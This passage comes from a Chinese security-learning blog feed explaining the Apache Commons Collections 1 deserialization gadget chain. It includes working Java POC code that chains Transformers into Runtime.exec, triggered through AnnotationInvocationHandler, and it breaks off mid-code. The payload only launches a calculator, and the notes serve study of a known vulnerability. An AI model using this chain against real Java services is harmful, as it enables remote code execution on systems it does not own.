outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>但这样还是存在和CC1一样的问题，只能用java8u71以前的版本</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CC1&amp;6</title>
    <link href="/Decemberus.github-io/2022/11/03/CC1%E4%B8%8ECC6(1)/"/>
    <url>/Decemberus.github-io/2022/11/03/CC1%E4%B8%8ECC6(1)/</url>
    
    <content type="html"><![CDATA[<h1 id="Common-Collections1-amp-6"><a href="#Common-Collections1-amp-6" class="headerlink" title="Common-Collections1&amp;6"></a>Common-Collections1&amp;6</h1><p>这里Common-Collections就不用yso官方的了，用p神的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections1_p</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                    &#123;<span class="hljs-string">&quot;C:/Windows/System32/calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>            transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>将上述代码中的计算器地址 替换成你本地环境⾥的计算器路径，运⾏就会发现弹出了计算器，下面说有以下所用到的接口和类</p><p>这里再导入包的时候经常会出错，原因就在于导入错包了</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191222535.png" alt="image-20230218210130035"> </p><p>一般系统自动导入的包是javax.xml.transform.Transformer;</p><p>但实际上Transformer是org.apache.commons.collections.Transformer;</p><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这个地方jdk的版本非常重要，我原本用的是jdk11，结果调用java内置的类的时候代码完全和网上的不一样，我以为时版本太低，换成了jdk17，结果还是不行，最后我换成了jdk8u67（一定要8u71以前的版本，不然不行），但是换完以后还是不行，通过陈杰好哥哥的帮忙才修改好，以下是配置步骤</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191222109.png" alt="image-20230111194851429"> </p><p>先点编辑配置</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191222758.png" alt="image-20230111194914219"> </p><p>这个地方换成自己的jdk路径</p><p>此时仍然不行，依然显示我用的jdk11</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223293.png" alt="image-20230111195036233"> </p><p>点这里的项目结构</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223777.png" alt="image-20230111195054106"> </p><p>将这里的sdk换成自己的路径</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223742.png" alt="image-20230111195216049"> </p><p>最后换掉这里的sdk，即可开始我们的学习之路</p><h2 id="P神的CC1利用链"><a href="#P神的CC1利用链" class="headerlink" title="P神的CC1利用链"></a>P神的CC1利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonCollections1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                    &#123;<span class="hljs-string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>            transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="类的理解"><a href="#类的理解" class="headerlink" title="类的理解"></a>类的理解</h3><h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, keyTransformer,<br>valueTransformer);<br></code></pre></td></tr></table></figure><p>在这里，TransformedMap.decorate() 方法返回一个新的 Map 对象，该对象由 innerMap 进行装饰。decorate包括对 innerMap 的键和值进行变换，通过 keyTransformer 和 valueTransformer 实现。</p><p>新的 Map 对象 outerMap 包含了 innerMap 的所有元素，但是键和值都已经被转换过了。</p><p>这里面的decorate方法源码是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法需要三个参数:</p><ul><li>innerMap：需要被装饰的 Map 对象</li><li>keyTransformer：用来对 innerMap 的键进行变换的函数</li><li>valueTransformer：用来对 innerMap 的值进行变换的函数</li></ul><p>这个方法的实现过程中，会通过遍历 innerMap 的所有元素，并使用 keyTransformer 和 valueTransformer 对键和值进行变换。最后，创建一个新的 Map 对象，该对象的元素由转换后的键和值组成。</p><h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><p>Transformer是⼀个接⼝，它只有⼀个待实现的⽅法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Transformer</span> &#123;<br> <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个’’回调函数’’，这个回调的参数是原始对象。</p><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>ConstantTransformer是实现了Transformer接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个对象，并在transform⽅法将这个对象再返回：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> &#123;<br> <span class="hljs-built_in">super</span>();<br> iConstant = constantToReturn;<br>&#125;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br> <span class="hljs-keyword">return</span> iConstant;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以他的作⽤其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作。</p><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序列化能执⾏任意代码的关键。</p><p>在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[]</span><br><span class="hljs-params">args)</span> &#123;<br> <span class="hljs-built_in">super</span>();<br> iMethodName = methodName;<br> iParamTypes = paramTypes;<br> iArgs = args;<br>&#125;<br></code></pre></td></tr></table></figure><p>后⾯的回调transform⽅法，就是执⾏了input对象的iMethodName⽅法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br> <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br> <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br> &#125;<br> <span class="hljs-keyword">try</span> &#123;<br> <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br> <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<br> <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>     <span class="hljs-comment">//实例化类，并获得类的方法，最后就可以执行任意函数</span><br> &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException ex) &#123;<br> <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +<br>iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; does not exist&quot;</span>);<br> &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException ex) &#123;<br> <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +<br>iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; cannot be accessed&quot;</span>);<br> &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br> <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +<br>iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; threw an exception&quot;</span>, ex);<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223375.png" alt="image-20221002194905431"> </p><p>上面有注释的那一行的含义如图所示，如此可以执行任意方法</p><h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，我们画⼀个图做示意：</p><p>ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，我们画⼀个图做示意：</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223611.png" alt="image-20230111101736120"> </p><p>代码如下图所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<br> <span class="hljs-built_in">super</span>();<br> iTransformers = transformers;<br>&#125;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;<br> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br> object = iTransformers[i].transform(object);<br> &#125;<br> <span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="源码理解"><a href="#源码理解" class="headerlink" title="源码理解"></a>源码理解</h3><p>看代码的主要部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>&#123;<span class="hljs-string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),<br>&#125;;<br><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br></code></pre></td></tr></table></figure><p>就像上面介绍的一样，ChainedTransformer包括了ConstantTransformer和InvokerTransformer，前者返回Runtime对象，InvorkerTransformer执行Runtime对象的exec方法，参数就是我们计算器</p><p>可以这样理解，Transformer把ConstantTransformer和InvokerTransformer装在了一起，相当于调用了<code>Runtime.getRuntime.exec.calc</code>然后放在了chain中</p><p>还有一个地方有疑惑，new Transformer[]是个什么用法</p><blockquote><p>是数组的声明与创建</p><p> <img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223818.png" alt="image-20220314204957973"> </p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223139.png" alt="image-20220314205656861"> </p></blockquote><p>当然，这个transformerChain只是⼀系列回调，我们需要⽤其来包装innerMap，使⽤的前⾯说到的TransformedMap.decorate ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>, transformerChain);<br></code></pre></td></tr></table></figure><p>因为这里的outerMap对象被使用TransformedMap.decorate方法进行装饰，使用的Transformer对象是ChainedTransformer，其中包含了ConstantTransformer和InvokerTransformer对象。因此，当向outerMap中添加键值对时，每个值都会被依次经过这两个Transformer对象的转换。</p><p>然后想map中放入一个新的元素来触发回调</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br></code></pre></td></tr></table></figure><p>比如这里，现在test的值为xxxx，”xxxx”会被ChainedTransformer中的ConstantTransformer转换成Runtime对象，然后被InvokerTransformer调用，最终会执行”&#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator”这个命令。由于这个命令是打开Mac系统自带的计算器应用程序，因此outerMap中的键值对为{“test”, 计算器应用程序的返回值}</p><h3 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h3><p>我们前面说过，触发这个漏洞的核心，在于我们需要向Map中加入一个新的元素。在demo中，我们可以手工执行 outerMap.put(“test”, “xxxx”); 来触发漏洞，但在实际反序列化时，我们需要找到一个类，它在反序列化的readObject逻辑里有类似的写入操作。</p><p>这个类就是 sun.reflect.annotation.AnnotationInvocationHandler ，我们查看它的readObject方法（这是8u71以前的代码，8u71以后做了一些修改，这个面再说）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java">  <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>      <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>s.defaultReadObject();<br><br>      <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>      <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">try</span> &#123;<br>          annotationType = AnnotationType.getInstance(t);<br>      &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>          <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>      &#125;<br><br>      Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br>      <span class="hljs-comment">// 与运行时映射类型一致</span><br>      Map&lt;String, Object&gt; mv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();<br><br>      <span class="hljs-comment">// If there are annotation members without values, that</span><br>      <span class="hljs-comment">// situation is handled by the invoke method.</span><br>      <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;<br>          <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>          <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>          Class&lt;?&gt; memberType = memberTypes.get(name);<br>          <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>              value = memberValue.getValue();<br>              <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                    value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                  value = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                          value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                              annotationType.members().get(name));<br>              &#125;<br>          &#125;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>核心逻辑就是 <code>Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()</code> 和<code>memberValue.setValue(...)</code> 。</p><p>memberValues就是反序列化后得到的Map，也是经过了<code>TransformedMap</code>修饰的对象，这里遍历了它的所有元素，并依次设置值。在调用setValue设置值的时候就会触发TransformedMap里注册的Transform，进而执行我们为其精心设计的任意代码。</p><p>所以，我们构造POC的时候，就需要创建一个<code>AnnotationInvocationHandler</code>对象，并将前面构造的HashMap设置进来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span><br>Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">construct</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<span class="hljs-comment">//通过构造器创建带参数的class对象对象</span><br>construct.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> construct.newInstance(Retention.class, outerMap);<br></code></pre></td></tr></table></figure><p>这里因为 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 是在JDK内部的类，不能直接使用new来实例化。我使用反射获取到了它的构造方法，并将其设置成外部可见的，再调用就可以实例化了。</p><p><code>AnnotationInvocationHandler</code>类的构造函数有两个参数，第一个参数是一个<code>Annotation</code>类；第二个是参数就是前面构造的Map。</p><h4 id="使用反射的原因"><a href="#使用反射的原因" class="headerlink" title="使用反射的原因"></a>使用反射的原因</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>oos.writeObject(obj);<br>oos.close();<br></code></pre></td></tr></table></figure><p>我将这几段代码拼接到demo代码的后面，组成一个完整的POC。我们试着运行这个POC，看看能否生成序列化数据流：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections1_p</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span 